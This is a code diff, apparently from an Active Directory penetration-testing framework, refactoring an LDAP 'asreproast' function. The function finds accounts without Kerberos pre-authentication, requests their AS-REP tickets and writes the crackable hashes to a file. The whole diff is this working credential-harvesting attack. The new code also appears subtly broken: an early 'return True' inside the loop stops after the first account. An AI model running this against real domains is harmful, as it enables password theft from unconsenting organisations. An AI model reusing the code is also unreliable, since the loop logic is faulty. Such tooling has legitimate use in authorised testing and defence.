@@ -843,66 +843,24 @@ class ldap(connection):
                 self.logger.highlight(f"{user.get('sAMAccountName', ''):<30}{pwd_last_set:<20}{user.get('badPwdCount', ''):<9}{user.get('description', '')}")
 
     def asreproast(self):
-        if self.password == "" and self.nthash == "" and self.kerberos is False:
+        if self.password == "" and self.nthash == "" and not self.kerberos:
             return False
 
         # Building the search filter
-        search_filter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
-        attributes = [
-            "sAMAccountName",
-            "pwdLastSet",
-            "MemberOf",
-            "userAccountControl",
-            "lastLogon",
-        ]
-        resp = self.search(search_filter, attributes, 0)
+        search_filter = f"(&(UserAccountControl:1.2.840.113556.1.4.803:={UF_DONT_REQUIRE_PREAUTH})(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE}))(!(objectCategory=computer)))"
+        resp = self.search(search_filter, attributes=["sAMAccountName"], sizeLimit=0)
         resp_parsed = parse_result_attributes(resp)
-        if resp is None:
+        if not resp_parsed:
             self.logger.highlight("No entries found!")
-        elif resp:
-            answers = []
-            self.logger.display(f"Total of records returned {len(resp):d}")
-
-            for item in resp_parsed:
-                mustCommit = False
-                sAMAccountName = ""
-                memberOf = ""
-                pwdLastSet = ""
-                userAccountControl = 0
-                lastLogon = "N/A"
-                try:
-                    sAMAccountName = item.get("sAMAccountName", "")
-                    mustCommit = sAMAccountName is not None
-                    userAccountControl = "0x%x" % int(item.get("userAccountControl", 0))
-                    memberOf = str(item.get("memberOf", " "))
-                    pwdLastSet = "<never>" if str(item.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("pwdLastSet", 0))))))
-                    pwdLastSet = "<never>" if str(item.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("lastLogon", 0))))))
-
-                    if mustCommit is True:
-                        answers.append(
-                            [
-                                sAMAccountName,
-                                memberOf,
-                                pwdLastSet,
-                                lastLogon,
-                                userAccountControl,
-                            ]
-                        )
-                except Exception as e:
-                    self.logger.debug("Exception:", exc_info=True)
-                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
-            if len(answers) > 0:
-                for user in answers:
-                    hash_TGT = KerberosAttacks(self).get_tgt_asroast(user[0])
-                    if hash_TGT:
-                        self.logger.highlight(f"{hash_TGT}")
-                        with open(self.args.asreproast, "a+") as hash_asreproast:
-                            hash_asreproast.write(f"{hash_TGT}\n")
-                return True
-            else:
-                self.logger.highlight("No entries found!")
         else:
-            self.logger.fail("Error with the LDAP account used")
+            self.logger.display(f"Total of records returned {len(resp):d}")
+            for user in resp_parsed:
+                hash_TGT = KerberosAttacks(self).get_tgt_asroast(user["sAMAccountName"])
+                if hash_TGT:
+                    self.logger.highlight(f"{hash_TGT}")
+                    with open(self.args.asreproast, "a+") as hash_asreproast:
+                        hash_asreproast.write(f"{hash_TGT}\n")
+                return True
 
     def kerberoasting(self):
         # Building the search filter
